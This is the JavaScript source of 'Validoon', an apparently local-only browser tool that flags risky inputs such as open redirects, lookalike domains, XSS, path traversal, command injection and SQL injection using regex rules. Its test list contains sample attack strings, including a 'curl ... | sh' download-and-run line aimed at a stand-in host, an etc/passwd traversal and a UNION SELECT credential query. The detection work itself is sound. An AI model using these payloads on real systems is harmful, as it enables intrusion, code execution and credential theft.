// app.js  (NORMALIZED v2)
(() => {
  "use strict";

  const BUILD = "v2026-01-05_normalayer_v2";
  const nowISO = () => new Date().toISOString();

  function $(id) { return document.getElementById(id); }

  function safeOn(el, evt, fn) {
    if (!el) return;
    el.addEventListener(evt, fn, { passive: true });
  }

  function shannonEntropy(str) {
    if (!str) return 0;
    const freq = new Map();
    for (const ch of str) freq.set(ch, (freq.get(ch) || 0) + 1);
    const len = str.length;
    let ent = 0;
    for (const [, c] of freq) {
      const p = c / len;
      ent -= p * Math.log2(p);
    }
    return Math.round(ent * 100) / 100;
  }

  // -------------------------
  // NORMALIZATION LAYER
  // -------------------------

  function safeDecodeURIComponentOnce(s) {
    try {
      // Treat '+' as space in query-ish contexts (common in URLs)
      const x = s.replace(/\+/g, "%20");
      return decodeURIComponent(x);
    } catch {
      return s; // keep original if malformed encoding
    }
  }

  function normalizeInput(raw) {
    let s = (raw ?? "").trim();
    if (!s) return { original: "", normalized: "", lowered: "" };

    // Strip wrapping quotes (common copy/paste artifacts)
    if ((s.startsWith('"') && s.endsWith('"')) || (s.startsWith("'") && s.endsWith("'"))) {
      s = s.slice(1, -1).trim();
    }

    // Collapse whitespace
    s = s.replace(/\s+/g, " ");

    // Iterative % decoding (catches %252f -> %2f -> /)
    // Cap iterations to avoid weird loops
    let decoded = s;
    for (let i = 0; i < 2; i++) {
      if (!/%[0-9a-f]{2}/i.test(decoded)) break;
      const next = safeDecodeURIComponentOnce(decoded);
      if (next === decoded) break;
      decoded = next;
    }

    // Normalize slashes for patterning (do not change displayed original)
    // Keep backslashes but also provide a slash-normalized view through lowered
    const normalized = decoded.trim();
    const lowered = normalized.toLowerCase();

    return { original: s, normalized, lowered };
  }

  function looksLikeURL(sLower) {
    return /^https?:\/\//i.test(sLower) || /^[a-z0-9.-]+\.[a-z]{2,}(\/|$)/i.test(sLower);
  }

  function extractHost(sLower) {
    // Best-effort host extraction without network calls
    // Handles:
    //  - https://host/path
    //  - host/path
    //  - host
    let x = sLower.trim();

    // Remove leading scheme
    x = x.replace(/^https?:\/\//, "");

    // Stop at first slash, ?, #
    x = x.split(/[\/?#]/)[0];

    // Remove possible credentials and port
    if (x.includes("@")) x = x.split("@").pop();
    x = x.split(":")[0];

    return x;
  }

  function classifyType(raw) {
    const n = normalizeInput(raw);
    const sLower = n.lowered;
    if (!sLower) return "Data";

    const isURL = looksLikeURL(sLower) || /(^|[?&])(url|next|returnurl|redirect_uri|redirect)=/i.test(sLower);

    const isExploit =
      /<script|onerror=|onload=|javascript:|data:text\/html|(\.\.\/){2,}|\\windows\\system32|union\s+select|1=1|--\s*$|wget\s+http|curl\s+-s|powershell\s+-enc/i.test(sLower);

    if (isExploit) return "Exploit";
    if (isURL) return "URL";
    return "Data";
  }

  // -------------------------
  // RULES (match on normalized/lowered)
  // -------------------------

  const RULES = [
    {
      label: "REDIRECT_PARAM",
      test: (n) =>
        /(^|[?&])(redirect_uri|redirect|returnurl|returnurl|next|url)=/i.test(n.lowered) ||
        /\b(returnurl|next)=\/\/[^ \n]+/i.test(n.lowered),
      sev: 55, conf: 90
    },
    {
      label: "AUTH_ENDPOINT",
      test: (n) => /(oauth\/authorize|oauth2\/authorize|\/signin\/oauth|login\.microsoftonline\.com\/common\/oauth2\/authorize)/i.test(n.lowered),
      sev: 45, conf: 80
    },
    {
      label: "BASE64_DECODE",
      test: (n) => /(data:text\/html;base64,|eyj[a-z0-9_-]{10,}\.[a-z0-9_-]{10,}\.[a-z0-9_-]{10,})/i.test(n.lowered),
      sev: 35, conf: 70
    },
    {
      label: "OBFUSCATION",
      test: (n) =>
        /%2f|%3a|%3d|%5c|\\x[0-9a-f]{2}|\\u[0-9a-f]{4}/i.test(n.normalized) ||
        /[A-Za-z0-9+\/]{30,}={0,2}/.test(n.normalized),
      sev: 35, conf: 67
    },
    {
      label: "HOMOGRAPH_RISK",
      test: (n) => /\bxn--/i.test(n.lowered),
      sev: 60, conf: 70
    },
    {
      label: "LOOKALIKE_BASIC",
      test: (n) => {
        const host = extractHost(n.lowered);
        if (!host || host.length < 6) return false;

        // Very targeted: common brand spoof patterns seen in your tests
        // paypal spoof: paypaI (I) -> lower becomes paypai
        const paypalSpoof = /\bpaypa[i1l]\b/.test(host.replace(/\.com$|\.net$|\.org$/,""));
        const msSpoof = /\bmicros0ft\b/.test(host.replace(/\.com$|\.net$|\.org$/,""));

        return paypalSpoof || msSpoof;
      },
      sev: 60, conf: 75
    },
    {
      label: "XSS/JS_SCRIPT",
      test: (n) => /<script|onerror=|onload=|javascript:|data:text\/html|<img[^>]+onerror=|<svg[^>]+onload=/i.test(n.lowered),
      sev: 85, conf: 85
    },
    {
      label: "LFI:ETC_PASSWD",
      test: (n) => /(\.\.\/){2,}etc\/passwd|etc\/passwd|windows\\system32\\drivers\\etc\\hosts/i.test(n.lowered),
      sev: 80, conf: 75
    },
    {
      label: "CMD:CMD_CHAIN",
      // tightened: avoids false hit on "data:...;base64"
      test: (n) => {
        const s = n.lowered;
        // command chaining tokens + common commands
        return /(^|\s)(&&|\|\|)\s*(curl|wget|bash|sh|powershell|cmd|whoami|ls|cat)\b/.test(s) ||
               /(^|\s)\|\s*(bash|sh|powershell|cmd|whoami|ls|cat)\b/.test(s) ||
               /(^|\s);\s*(bash|sh|powershell|cmd|whoami|ls|cat)\b/.test(s) ||
               /\bpowershell\s+-enc\b/.test(s);
      },
      sev: 85, conf: 85
    },
    {
      label: "DOWNLOAD_TOOL",
      test: (n) => /\b(wget|curl)\b.*\bhttps?:\/\/.*(\|\s*(sh|bash)|-o-|\|\s*sh)/i.test(n.lowered),
      sev: 90, conf: 90
    },
    {
      label: "SQL:SQLI_TAUTOLOGY",
      test: (n) => /(1\s*=\s*1(\s*or\s*1\s*=\s*1)?|'\s*or\s*'1'\s*=\s*'1|admin'\s*--|select\s+\*\s+from\s+\w+\s+where)/i.test(n.lowered),
      sev: 75, conf: 85
    },
    {
      label: "SQL:SQLI_UNION_ALL",
      test: (n) => /union\s+select/i.test(n.lowered),
      sev: 80, conf: 80
    }
  ];

  function analyzeOne(inputRaw) {
    const n = normalizeInput(inputRaw);
    const hits = [];

    for (const r of RULES) {
      if (r.test(n)) hits.push({ label: r.label, sev: r.sev, conf: r.conf });
    }

    let severity = 0, confidence = 0;
    if (hits.length) {
      severity = Math.max(...hits.map(h => h.sev));
      confidence = Math.max(...hits.map(h => h.conf));
    }

    let decision = "ALLOW";
    if (hits.some(h => h.sev >= 85) || hits.some(h => h.label === "DOWNLOAD_TOOL")) decision = "BLOCK";
    else if (hits.some(h => h.sev >= 55)) decision = "WARN";

    const type = classifyType(inputRaw);
    const entropy = shannonEntropy(n.normalized || n.original);

    return {
      input: n.original,
      normalized: n.normalized,   // added for JSON export (UI unchanged)
      type,
      decision,
      severity,
      confidence,
      entropy,
      hits
    };
  }

  function verdictFrom(rows) {
    const counts = { scans: rows.length, allow: 0, warn: 0, block: 0 };
    for (const r of rows) {
      if (r.decision === "ALLOW") counts.allow++;
      else if (r.decision === "WARN") counts.warn++;
      else counts.block++;
    }

    const peakSeverity = rows.length ? Math.max(...rows.map(r => r.severity)) : 0;
    const confidence = rows.length ? Math.max(...rows.map(r => r.confidence)) : 0;

    let verdict = "SECURE";
    if (counts.block > 0) verdict = "DANGER";
    else if (counts.warn > 0) verdict = "SUSPICIOUS";

    const sigMap = new Map();
    for (const r of rows) {
      for (const h of r.hits) sigMap.set(h.label, (sigMap.get(h.label) || 0) + 1);
    }
    const signals = [...sigMap.entries()]
      .sort((a, b) => b[1] - a[1])
      .map(([label, count]) => ({ label, count }));

    return { verdict, peakSeverity, confidence, counts, signals };
  }

  function buildReport(rows) {
    const meta = verdictFrom(rows);
    return {
      generatedAt: nowISO(),
      verdict: meta.verdict,
      peakSeverity: meta.peakSeverity,
      confidence: meta.confidence,
      counts: meta.counts,
      signals: meta.signals,
      rows
    };
  }

  function setVerdictUI(meta) {
    const verdictText = $("verdictText");
    const box = $("verdictBox");
    if (!verdictText || !box) return;

    verdictText.textContent = meta.verdict;

    box.style.borderColor =
      meta.verdict === "DANGER" ? "rgba(239,68,68,.35)" :
      meta.verdict === "SUSPICIOUS" ? "rgba(245,158,11,.35)" :
      "rgba(45,212,191,.25)";

    $("peakSev").textContent = `Peak severity: ${meta.peakSeverity}%`;
    $("peakConf").textContent = `Confidence: ${meta.confidence}%`;

    $("kScans").textContent = String(meta.counts.scans);
    $("kAllow").textContent = String(meta.counts.allow);
    $("kWarn").textContent = String(meta.counts.warn);
    $("kBlock").textContent = String(meta.counts.block);

    const reco = $("reco");
    if (reco) {
      if (meta.verdict === "DANGER") {
        reco.textContent = "Remediation: Block these inputs in the pipeline. Do NOT open. Verify domain ownership. Escalate with JSON report.";
      } else if (meta.verdict === "SUSPICIOUS") {
        reco.textContent = "Remediation: Review suspicious entries. Verify domains. Sanitize/encode. Escalate if needed.";
      } else {
        reco.textContent = "No high-severity patterns detected.";
      }
    }

    const sigWrap = $("signals");
    if (sigWrap) {
      sigWrap.innerHTML = "";
      for (const s of meta.signals) {
        const d = document.createElement("div");
        d.className = "sig";
        d.textContent = `${s.label} ×${s.count}`;
        sigWrap.appendChild(d);
      }
      if (!meta.signals.length) {
        const d = document.createElement("div");
        d.className = "sig";
        d.textContent = "No active signals";
        sigWrap.appendChild(d);
      }
    }
  }

  function renderRows(rows) {
    const host = $("rows");
    if (!host) return;
    host.innerHTML = "";

    for (const r of rows) {
      const tr = document.createElement("div");
      tr.className = "trow";

      const dotClass = r.decision === "ALLOW" ? "ok" : (r.decision === "WARN" ? "warn" : "bad");

      const c1 = document.createElement("div");
      c1.className = "mono";
      c1.textContent = r.input.length > 120 ? r.input.slice(0, 120) + "…" : r.input;

      const c2 = document.createElement("div");
      c2.textContent = r.type;

      const c3 = document.createElement("div");
      c3.className = "tag";
      const dot = document.createElement("span");
      dot.className = `dot ${dotClass}`;
      const t = document.createElement("span");
      t.textContent = r.decision;
      c3.append(dot, t);

      const c4 = document.createElement("div");
      c4.textContent = `${r.severity}%`;

      const c5 = document.createElement("div");
      c5.textContent = `${r.confidence}%`;

      const c6 = document.createElement("div");
      c6.textContent = String(r.entropy);

      tr.append(c1, c2, c3, c4, c5, c6);
      host.appendChild(tr);
    }
  }

  function parseInputLines(txt) {
    return (txt || "")
      .split(/\r?\n/)
      .map(s => s.trim())
      .filter(Boolean);
  }

  const TEST_B = [
    "hello world",
    "https://example.com/",
    "https://good.com/redirect?next=https%3A%2F%2Fevil.com",
    "returnUrl=//evil.com",
    "url=javascript:alert(1)",
    "<img src=x onerror=alert(1)>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "../../../../etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "&& curl http://evl1.tld/payload.sh | sh",
    "UNION SELECT username,password FROM users",
    "powershell -enc SQBFAFgA",
    // NEW checks for normalization + lookalike
    "..%252f..%252f..%252f..%252fetc%252fpasswd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "http://paypaI.com/security",
    "http://micros0ft.com/account/verify"
  ];

  let lastReport = null;

  function runScanFromTextarea() {
    const inputEl = $("input");
    if (!inputEl) return;

    const lines = parseInputLines(inputEl.value);
    const rows = lines.map(analyzeOne);
    const report = buildReport(rows);

    lastReport = report;

    setVerdictUI({
      verdict: report.verdict,
      peakSeverity: report.peakSeverity,
      confidence: report.confidence,
      counts: report.counts,
      signals: report.signals
    });

    renderRows(report.rows);
  }

  function exportJSON() {
    if (!lastReport) runScanFromTextarea();
    if (!lastReport) return;

    const blob = new Blob([JSON.stringify(lastReport, null, 2)], { type: "application/json" });
    const a = document.createElement("a");
    const ts = new Date().toISOString().replace(/[:.]/g, "-");
    a.download = `validoon_report_${ts}.json`;
    a.href = URL.createObjectURL(blob);
    document.body.appendChild(a);
    a.click();
    setTimeout(() => {
      URL.revokeObjectURL(a.href);
      a.remove();
    }, 0);
  }

  function clearAll() {
    const inputEl = $("input");
    if (inputEl) inputEl.value = "";
    lastReport = null;

    setVerdictUI({
      verdict: "SECURE",
      peakSeverity: 0,
      confidence: 0,
      counts: { scans: 0, allow: 0, warn: 0, block: 0 },
      signals: []
    });

    renderRows([]);
  }

  function loadTest(lines) {
    const inputEl = $("input");
    if (!inputEl) return;
    inputEl.value = lines.join("\n");
    runScanFromTextarea();
  }

  function openInfo() {
    const dlg = $("infoDlg");
    if (dlg && typeof dlg.showModal === "function") dlg.showModal();
  }

  function closeInfo() {
    const dlg = $("infoDlg");
    if (dlg && typeof dlg.close === "function") dlg.close();
  }

  function boot() {
    const stamp = $("buildStamp");
    if (stamp) stamp.textContent = `Build: ${BUILD}`;

    setVerdictUI({
      verdict: "SECURE",
      peakSeverity: 0,
      confidence: 0,
      counts: { scans: 0, allow: 0, warn: 0, block: 0 },
      signals: []
    });

    // Keep A button behavior as-is if your HTML has it; load B uses improved list
    safeOn($("btnLoadB"), "click", () => loadTest(TEST_B));
    safeOn($("btnScan"), "click", runScanFromTextarea);
    safeOn($("btnExport"), "click", exportJSON);
    safeOn($("btnClear"), "click", clearAll);
    safeOn($("btnInfo"), "click", openInfo);
    safeOn($("btnCloseInfo"), "click", closeInfo);

    console.log(`[Validoon] ${BUILD} loaded. Local-only. No network.`);
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", boot);
  } else {
    boot();
  }
})();
